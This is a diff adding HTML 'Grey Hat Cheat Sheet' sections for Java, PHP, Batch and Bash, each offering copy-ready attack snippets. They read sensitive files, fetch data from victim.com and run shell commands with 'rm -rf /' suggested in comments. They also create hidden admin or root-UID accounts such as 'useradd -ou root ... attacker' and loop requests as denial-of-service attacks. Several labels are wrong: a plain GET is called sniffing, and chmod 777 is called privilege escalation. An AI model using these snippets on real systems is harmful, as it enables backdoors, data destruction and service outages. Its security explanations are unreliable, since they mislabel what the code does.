@@ -1023,6 +1023,432 @@ int main() {
     </div>
   </div>
   </code>
+  <!-- php -->
+    <div class="container mx-auto p-6">
+    <h1 class="text-3xl font-bold text-white text-center mb-6">Java Grey Hat Cheat Sheet</h1>
+
+    <div class="bg-gray-800 p-6 rounded-lg shadow-lg">
+
+      <!-- Categorized Sections -->
+      <h2 class="section-title text-2xl text-indigo-400">File System Access</h2>
+
+      <!-- Reading a File -->
+      <div class="command-container">
+        <h3 class="text-xl text-indigo-300">Read a File in Java</h3>
+        <p class="text-gray-200 mb-2">Reading sensitive files from a system using Java.</p>
+        <div class="code-block">
+          <pre id="read_file_java">
+import java.io.*;
+public class FileReaderExample {
+  public static void main(String[] args) throws IOException {
+    File file = new File("path/to/sensitive_file.txt");
+    BufferedReader br = new BufferedReader(new FileReader(file));
+    String line;
+    while ((line = br.readLine()) != null) {
+      System.out.println(line); // Output contents of the file
+    }
+    br.close();
+  }
+}
+          </pre>
+        </div>
+        <button onclick="copyToClipboard('read_file_java')" class="copy-btn">Copy</button>
+      </div>
+
+      <h2 class="section-title text-2xl text-indigo-400">Network Attacks</h2>
+
+      <!-- HTTP Request Sniffing -->
+      <div class="command-container">
+        <h3 class="text-xl text-indigo-300">Sniffing HTTP Requests in Java</h3>
+        <p class="text-gray-200 mb-2">Capturing HTTP requests and analyzing responses in Java.</p>
+        <div class="code-block">
+          <pre id="http_sniffing_java">
+import java.io.*;
+import java.net.*;
+public class HttpSniffer {
+  public static void main(String[] args) throws IOException {
+    URL url = new URL("http://victim.com/sensitive_data");
+    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+    conn.setRequestMethod("GET");
+    BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
+    String inputLine;
+    while ((inputLine = in.readLine()) != null) {
+      System.out.println(inputLine); // Intercept response
+    }
+    in.close();
+  }
+}
+          </pre>
+        </div>
+        <button onclick="copyToClipboard('http_sniffing_java')" class="copy-btn">Copy</button>
+      </div>
+
+      <h2 class="section-title text-2xl text-indigo-400">Code Injection</h2>
+
+      <!-- Command Injection -->
+      <div class="command-container">
+        <h3 class="text-xl text-indigo-300">Command Injection via Java</h3>
+        <p class="text-gray-200 mb-2">Injecting system commands into a vulnerable Java program.</p>
+        <div class="code-block">
+          <pre id="command_injection_java">
+import java.io.*;
+public class CommandInjection {
+  public static void main(String[] args) throws IOException {
+    String command = "ls"; // Malicious command (e.g., "rm -rf /")
+    Process process = Runtime.getRuntime().exec(command);
+    BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
+    String line;
+    while ((line = reader.readLine()) != null) {
+      System.out.println(line); // Executes and outputs command result
+    }
+  }
+}
+          </pre>
+        </div>
+        <button onclick="copyToClipboard('command_injection_java')" class="copy-btn">Copy</button>
+      </div>
+
+      <h2 class="section-title text-2xl text-indigo-400">Privilege Escalation</h2>
+
+      <!-- Privilege Escalation via Java -->
+      <div class="command-container">
+        <h3 class="text-xl text-indigo-300">Escalating Privileges in Java</h3>
+        <p class="text-gray-200 mb-2">Attempting to escalate privileges by manipulating system calls or using weak configurations.</p>
+        <div class="code-block">
+          <pre id="privilege_escalation_java">
+import java.io.*;
+public class PrivilegeEscalation {
+  public static void main(String[] args) throws IOException {
+    String command = "chmod 777 /path/to/sensitive_file"; // Vulnerable to escalation
+    Process process = Runtime.getRuntime().exec(command);
+    process.waitFor();
+    System.out.println("Privilege Escalation Command Executed!");
+  }
+}
+          </pre>
+        </div>
+        <button onclick="copyToClipboard('privilege_escalation_java')" class="copy-btn">Copy</button>
+      </div>
+
+      <h2 class="section-title text-2xl text-indigo-400">Denial of Service (DoS)</h2>
+
+      <!-- DoS with Java -->
+      <div class="command-container">
+        <h3 class="text-xl text-indigo-300">DoS Attack using Java</h3>
+        <p class="text-gray-200 mb-2">Creating a DoS (Denial of Service) attack by overwhelming a service with requests.</p>
+        <div class="code-block">
+          <pre id="dos_java">
+import java.io.*;
+import java.net.*;
+public class DoSAttack {
+  public static void main(String[] args) throws IOException {
+    while(true) {
+      URL url = new URL("http://victim.com");
+      HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+      conn.setRequestMethod("GET");
+      conn.getInputStream();
+      System.out.println("Sending request...");
+    }
+  }
+}
+          </pre>
+        </div>
+        <button onclick="copyToClipboard('dos_java')" class="copy-btn">Copy</button>
+      </div>
+
+    </div>
+  </div>
+  <!-- php -->
+    <div class="container mx-auto p-6">
+    <h1 class="text-3xl font-bold text-white text-center mb-6">PHP Grey Hat Cheat Sheet</h1>
+
+    <div class="bg-gray-800 p-6 rounded-lg shadow-lg">
+
+      <!-- Categorized Sections -->
+      <h2 class="section-title text-2xl text-indigo-400">File System Access</h2>
+
+      <!-- Reading a File -->
+      <div class="command-container">
+        <h3 class="text-xl text-indigo-300">Read a File in PHP</h3>
+        <p class="text-gray-200 mb-2">Reading sensitive files from a system using PHP.</p>
+        <div class="code-block">
+          <pre id="read_file_php">
+<?php
+$file = "path/to/sensitive_file.txt";
+if (file_exists($file)) {
+  $contents = file_get_contents($file);
+  echo $contents; // Output file contents
+}
+?>
+          </pre>
+        </div>
+        <button onclick="copyToClipboard('read_file_php')" class="copy-btn">Copy</button>
+      </div>
+
+      <h2 class="section-title text-2xl text-indigo-400">Network Attacks</h2>
+
+      <!-- HTTP Request Sniffing -->
+      <div class="command-container">
+        <h3 class="text-xl text-indigo-300">Sniffing HTTP Requests in PHP</h3>
+        <p class="text-gray-200 mb-2">Capturing HTTP requests and analyzing responses in PHP.</p>
+        <div class="code-block">
+          <pre id="http_sniffing_php">
+<?php
+$url = "http://victim.com/sensitive_data";
+$response = file_get_contents($url);
+echo $response; // Intercept response
+?>
+          </pre>
+        </div>
+        <button onclick="copyToClipboard('http_sniffing_php')" class="copy-btn">Copy</button>
+      </div>
+
+      <h2 class="section-title text-2xl text-indigo-400">Code Injection</h2>
+
+      <!-- Command Injection -->
+      <div class="command-container">
+        <h3 class="text-xl text-indigo-300">Command Injection via PHP</h3>
+        <p class="text-gray-200 mb-2">Injecting system commands into a vulnerable PHP program.</p>
+        <div class="code-block">
+          <pre id="command_injection_php">
+<?php
+$command = "ls"; // Malicious command (e.g., "rm -rf /")
+$output = shell_exec($command);
+echo $output; // Executes and outputs command result
+?>
+          </pre>
+        </div>
+        <button onclick="copyToClipboard('command_injection_php')" class="copy-btn">Copy</button>
+      </div>
+
+      <h2 class="section-title text-2xl text-indigo-400">Privilege Escalation</h2>
+
+      <!-- Privilege Escalation via PHP -->
+      <div class="command-container">
+        <h3 class="text-xl text-indigo-300">Escalating Privileges in PHP</h3>
+        <p class="text-gray-200 mb-2">Attempting to escalate privileges by manipulating system calls or using weak configurations.</p>
+        <div class="code-block">
+          <pre id="privilege_escalation_php">
+<?php
+$command = "chmod 777 /path/to/sensitive_file"; // Vulnerable to escalation
+$output = shell_exec($command);
+echo "Privilege Escalation Command Executed!";
+?>
+          </pre>
+        </div>
+        <button onclick="copyToClipboard('privilege_escalation_php')" class="copy-btn">Copy</button>
+      </div>
+
+      <h2 class="section-title text-2xl text-indigo-400">Denial of Service (DoS)</h2>
+
+      <!-- DoS with PHP -->
+      <div class="command-container">
+        <h3 class="text-xl text-indigo-300">DoS Attack using PHP</h3>
+        <p class="text-gray-200 mb-2">Creating a DoS (Denial of Service) attack by overwhelming a service with requests.</p>
+        <div class="code-block">
+          <pre id="dos_php">
+<?php
+while(true) {
+  $url = "http://victim.com";
+  file_get_contents($url);
+  echo "Sending request...\n";
+}
+?>
+          </pre>
+        </div>
+        <button onclick="copyToClipboard('dos_php')" class="copy-btn">Copy</button>
+      </div>
+
+    </div>
+  </div>
+  <!-- batch-->
+    <div class="container mx-auto p-6">
+    <h1 class="text-3xl font-bold text-white text-center mb-6">Batch Grey Hat Cheat Sheet</h1>
+
+    <div class="bg-gray-800 p-6 rounded-lg shadow-lg">
+
+      <!-- Categorized Sections -->
+      <h2 class="section-title text-2xl text-indigo-400">File System Access</h2>
+
+      <!-- Reading a File -->
+      <div class="command-container">
+        <h3 class="text-xl text-indigo-300">Read a File in Batch</h3>
+        <p class="text-gray-200 mb-2">Reading sensitive files from a system using Batch scripting.</p>
+        <div class="code-block">
+          <pre id="read_file_batch">
+@echo off
+set file=path\to\sensitive_file.txt
+for /f "tokens=*" %%a in (%file%) do echo %%a
+          </pre>
+        </div>
+        <button onclick="copyToClipboard('read_file_batch')" class="copy-btn">Copy</button>
+      </div>
+
+      <h2 class="section-title text-2xl text-indigo-400">Network Attacks</h2>
+
+      <!-- HTTP Request Sniffing -->
+      <div class="command-container">
+        <h3 class="text-xl text-indigo-300">Sniffing HTTP Requests in Batch</h3>
+        <p class="text-gray-200 mb-2">Capturing HTTP requests and analyzing responses in Batch.</p>
+        <div class="code-block">
+          <pre id="http_sniffing_batch">
+@echo off
+set url=http://victim.com/sensitive_data
+curl %url% --output sniffed_data.txt
+echo Data captured from: %url%
+          </pre>
+        </div>
+        <button onclick="copyToClipboard('http_sniffing_batch')" class="copy-btn">Copy</button>
+      </div>
+
+      <h2 class="section-title text-2xl text-indigo-400">Code Injection</h2>
+
+      <!-- Command Injection -->
+      <div class="command-container">
+        <h3 class="text-xl text-indigo-300">Command Injection via Batch</h3>
+        <p class="text-gray-200 mb-2">Injecting system commands into a vulnerable Batch script.</p>
+        <div class="code-block">
+          <pre id="command_injection_batch">
+@echo off
+set command=dir
+echo Executing command: %command%
+%command%
+          </pre>
+        </div>
+        <button onclick="copyToClipboard('command_injection_batch')" class="copy-btn">Copy</button>
+      </div>
+
+      <h2 class="section-title text-2xl text-indigo-400">Privilege Escalation</h2>
+
+      <!-- Privilege Escalation via Batch -->
+      <div class="command-container">
+        <h3 class="text-xl text-indigo-300">Escalating Privileges in Batch</h3>
+        <p class="text-gray-200 mb-2">Attempting to escalate privileges by manipulating system calls or using weak configurations.</p>
+        <div class="code-block">
+          <pre id="privilege_escalation_batch">
+@echo off
+set command=net user admin /add
+echo Adding a new user with admin rights
+%command%
+          </pre>
+        </div>
+        <button onclick="copyToClipboard('privilege_escalation_batch')" class="copy-btn">Copy</button>
+      </div>
+
+      <h2 class="section-title text-2xl text-indigo-400">Denial of Service (DoS)</h2>
+
+      <!-- DoS with Batch -->
+      <div class="command-container">
+        <h3 class="text-xl text-indigo-300">DoS Attack using Batch</h3>
+        <p class="text-gray-200 mb-2">Creating a DoS (Denial of Service) attack by overwhelming a service with requests.</p>
+        <div class="code-block">
+          <pre id="dos_batch">
+@echo off
+:loop
+curl http://victim.com > nul
+goto loop
+          </pre>
+        </div>
+        <button onclick="copyToClipboard('dos_batch')" class="copy-btn">Copy</button>
+      </div>
+
+    </div>
+  </div>
+  <!--bash -->
+    <div class="container mx-auto p-6">
+    <h1 class="text-3xl font-bold text-white text-center mb-6">Bash Grey Hat Cheat Sheet</h1>
+
+    <div class="bg-gray-800 p-6 rounded-lg shadow-lg">
+
+      <!-- Categorized Sections -->
+      <h2 class="section-title text-2xl text-indigo-400">File System Access</h2>
+
+      <!-- Reading a File -->
+      <div class="command-container">
+        <h3 class="text-xl text-indigo-300">Read a File in Bash</h3>
+        <p class="text-gray-200 mb-2">Reading sensitive files from a system using Bash scripting.</p>
+        <div class="code-block">
+          <pre id="read_file_bash">
+#!/bin/bash
+file="/path/to/sensitive_file.txt"
+while IFS= read -r line; do
+  echo "$line"
+done < "$file"
+          </pre>
+        </div>
+        <button onclick="copyToClipboard('read_file_bash')" class="copy-btn">Copy</button>
+      </div>
+
+      <h2 class="section-title text-2xl text-indigo-400">Network Attacks</h2>
+
+      <!-- HTTP Request Sniffing -->
+      <div class="command-container">
+        <h3 class="text-xl text-indigo-300">Sniffing HTTP Requests in Bash</h3>
+        <p class="text-gray-200 mb-2">Capturing HTTP requests and analyzing responses in Bash.</p>
+        <div class="code-block">
+          <pre id="http_sniffing_bash">
+#!/bin/bash
+url="http://victim.com/sensitive_data"
+curl "$url" --output sniffed_data.txt
+echo "Data captured from: $url"
+          </pre>
+        </div>
+        <button onclick="copyToClipboard('http_sniffing_bash')" class="copy-btn">Copy</button>
+      </div>
+
+      <h2 class="section-title text-2xl text-indigo-400">Code Injection</h2>
+
+      <!-- Command Injection -->
+      <div class="command-container">
+        <h3 class="text-xl text-indigo-300">Command Injection via Bash</h3>
+        <p class="text-gray-200 mb-2">Injecting system commands into a vulnerable Bash script.</p>
+        <div class="code-block">
+          <pre id="command_injection_bash">
+#!/bin/bash
+command="ls -l"
+echo "Executing command: $command"
+$command
+          </pre>
+        </div>
+        <button onclick="copyToClipboard('command_injection_bash')" class="copy-btn">Copy</button>
+      </div>
+
+      <h2 class="section-title text-2xl text-indigo-400">Privilege Escalation</h2>
+
+      <!-- Privilege Escalation via Bash -->
+      <div class="command-container">
+        <h3 class="text-xl text-indigo-300">Escalating Privileges in Bash</h3>
+        <p class="text-gray-200 mb-2">Attempting to escalate privileges by manipulating system calls or using weak configurations.</p>
+        <div class="code-block">
+          <pre id="privilege_escalation_bash">
+#!/bin/bash
+sudo useradd -ou root -g root attacker
+echo "Attacker account created with root privileges."
+sudo passwd attacker
+          </pre>
+        </div>
+        <button onclick="copyToClipboard('privilege_escalation_bash')" class="copy-btn">Copy</button>
+      </div>
+
+      <h2 class="section-title text-2xl text-indigo-400">Denial of Service (DoS)</h2>
+
+      <!-- DoS with Bash -->
+      <div class="command-container">
+        <h3 class="text-xl text-indigo-300">DoS Attack using Bash</h3>
+        <p class="text-gray-200 mb-2">Creating a DoS (Denial of Service) attack by overwhelming a service with requests.</p>
+        <div class="code-block">
+          <pre id="dos_bash">
+#!/bin/bash
+while true; do
+  curl http://victim.com > /dev/null
+done
+          </pre>
+        </div>
+        <button onclick="copyToClipboard('dos_bash')" class="copy-btn">Copy</button>
+      </div>
+
+    </div>
+  </div>
       </main>
     </div>
   </div>
